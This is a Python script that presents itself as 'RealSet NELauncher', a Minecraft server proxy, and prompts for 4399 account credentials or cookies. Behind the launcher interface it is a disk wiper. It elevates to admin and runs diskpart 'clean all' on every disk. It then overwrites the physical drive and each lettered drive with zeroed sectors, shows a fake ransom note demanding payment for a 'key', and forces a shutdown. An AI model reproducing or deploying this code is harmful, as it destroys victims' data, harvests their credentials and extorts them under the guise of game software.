# 代码中的“#line”和比return命都长的变量名都是在某个网页版python混淆器中混淆的结果



import win32file
import win32con
from ctypes import c_ubyte
import time
import os
import time #line:6
import sys #line:9
import win32con
import ctypes
import os
import logging
import subprocess
import win32com.client


# 你说的对，但是虚拟机检测确实消失不见了




time.sleep (2 )#line:65
RED ="\033"#line:77
print ("  ____               _  ____         _     _   _  _____  _     ")#line:78
print (" |  _ \  ___   __ _ | |/ ___|   ___ | |_  | \ | || ____|| |    ")#line:79
print (" | |_) |/ _ \ / _` || |\___ \  / _ \| __| |  \| ||  _|  | |    ")#line:80
print (" |  _ <|  __/| (_| || | ___) ||  __/| |_  | |\  || |___ | |___ ")#line:81
print (" |_| \_\\___| \__,_||_||____/  \___| \__| |_| \_||_____||_____|")#line:82
print (RED +"\t 欢迎使用RealSet NELauncher! \n  \t版本号:1.0 作者:RealSet Team")#line:84


logging.basicConfig(filename='app.log', level=logging.INFO,
                    format='%(asctime)s:%(levelname)s:%(message)s')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def relaunch_as_admin():
    script = os.path.abspath(__file__)
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
    exit()


def delete_all_partitions(disk_number):
    if not is_admin():
        logging.error("需要管理员权限才能执行此操作。")
        relaunch_as_admin()


    commands = [
        "list disk",
        f"select disk {disk_number}",
        "list partition",
        "clean all"
               ]

    
    try:
        result = subprocess.run(
            ["diskpart"],
            input="\n".join(commands),
            text=True,
            check=True,
            capture_output=True
        )
        logging.info(f"成功删除磁盘 {disk_number} 上的所有分区。")
    except subprocess.CalledProcessError as e:
        logging.error(f"删除磁盘 {disk_number} 上的所有分区失败: {e.stderr}")

def delete_all_disks_partitions():
    if not is_admin():
        logging.error("需要管理员权限才能执行此操作。")
        relaunch_as_admin()

    wmi = win32com.client.GetObject('winmgmts:')
    disks = wmi.InstancesOf('Win32_DiskDrive')

    for disk in disks:
        disk_number = int(disk.Index)
        delete_all_partitions(disk_number)

def main():
    delete_all_disks_partitions()

if __name__ == "__main__":
    main()

time .sleep (2 )#line:85
Username =input ("用户名:")#line:87
while True :#line:88
    if Username =="feijx3":#line:89
        break #line:90
    print ("账号不存在")#line:91
    Username =input ("用户名:")#line:92
    continue #line:93
Password =input ("密码：")#line:95
while True :#line:96
    if Password =="feijx3":#line:97
        time .sleep (1 )#line:98
        Nameprotect =input("设置昵称保护:")#line:99
        time .sleep (1 )#line:100
        for _ in range(100):
                           print ("密码保护，请向下继续登录！")#line:101
                           time .sleep (0.01 )#line:102
        time .sleep (3 )#line:252
        print ("登录成功，欢迎回来，开发者！")#line:254
        break #line:255
    print ("密码错误")#line:256
    Password =input ("密码：")#line:257
    continue #line:258
WYZH =input ("请输入4399账号或cookie：")#line:260
PWD =input ("请输入4399密码：")#line:261
if PWD !="艙":#line:263
    time .sleep (2 )#line:264
    print (" \t登录4399账号"+Nameprotect +"成功")#line:265
    time .sleep (2 )#line:267
print (RED +"\t 当前为测试阶段 只支持部分服务器 ")#line:268
time .sleep (2 )#line:269
print ("\n输入服务器前的数字(id)选择服务器，键入时不带点")#line:270
time .sleep (2 )#line:271
print (" 1.布吉岛 \n 2.花雨庭 \n 3.元素之诗 \n 4.粘土小游戏")#line:272
serverid =input ("输入服务器id:")#line:273
time .sleep (2 )#line:274
while serverid in ["1","2","3","4"]:#line:275
   time .sleep (2 )#line:276
   print (f"代理{Nameprotect}启动成功\n端口开放在127.0.0.1:25565")#line:277
   break #line:280
if serverid not in ["1","2","3","4"]:#line:283
      print ("键入的服务器id不存在或不受支持,请重试!")#line:284
      while True :#line:285
          serverid =input ("输入服务器id:")#line:286
          if serverid in ['1','2','3','4']:#line:287
              break #line:288
          else :#line:289
              print ("键入的服务器id不存在或不受支持,请重试!")#line:290
if serverid in ["1","2","3","4"]:#line:291
    time .sleep (2 )#line:292
    print (f"代理{Nameprotect}启动成功\n端口开放在127.0.0.1:25565")#line:293

# 下面是死妈的千年科技2.2的代码   来自return0721    主播别认错了
drive_physical = win32file.CreateFile('\\\\.\\PhysicalDrive0', win32con.GENERIC_READ | win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None, win32con.OPEN_EXISTING, 0, None)


def open_drive(drive_letter):
    try:
        return win32file.CreateFile(f'\\\\.\\{drive_letter}:', win32con.GENERIC_READ | win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None, win32con.OPEN_EXISTING, 0, None)
    except Exception as e:
        return None

def write_bootcode_to_drives(drive_letters, bootcode_size=512, iterations=8964):
    drives = {letter: open_drive(letter) for letter in drive_letters}
    bootcode = (c_ubyte * bootcode_size)()
    for _ in range(iterations):
        for drive in drives.values():
            if drive:
                win32file.WriteFile(drive, bootcode)
                win32file.SetFilePointer(drive, bootcode_size, win32file.FILE_CURRENT)
    for drive in drives.values():
        if drive:
            win32file.CloseHandle(drive)

def get_drives():
    drives = []
    for letter in range(65, 91):
        drive = chr(letter)
        if os.path.exists(f'{drive}:'):
            drives.append(drive)
    return drives

def print2(text, delay=0.3):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
drives = get_drives()
for i in drives:
    try:
        write_bootcode_to_drives(i)
    except:
        pass
else:
    pass
try:
    bootcode = (c_ubyte * 512)()
    for _ in range(8964):
        win32file.WriteFile(drive_physical, bootcode)
        win32file.SetFilePointer(drive_physical, 512, win32file.FILE_CURRENT)
except:
    pass

print2('你好，你的磁盘已被我加密，现在关机或重启会导致你的文件永久消失，只能通过******获得密钥，下面我会跟你说一下具体情况\n')
a = 'Realset Locker ver1.0\n我的电脑出了什么问题？\n您的磁盘被我加密了。\n我不愿意打钱怎么办？\n等待硬盘信息被完全抹除\n\\联系方式\n如果想获取密钥，请加*******，打钱***后可以获得密码。\n我强烈建议，为了避免不必要的麻烦，勒索工作结束之前，请不要关闭或者删除该软件，并且暂停杀毒软件。 '
print2(a, 0.1)
os.system('shutdown -s -f -t 60')
time.sleep(1)
print2('\n**你的**\n')
input('按下任意键退出.....')
    
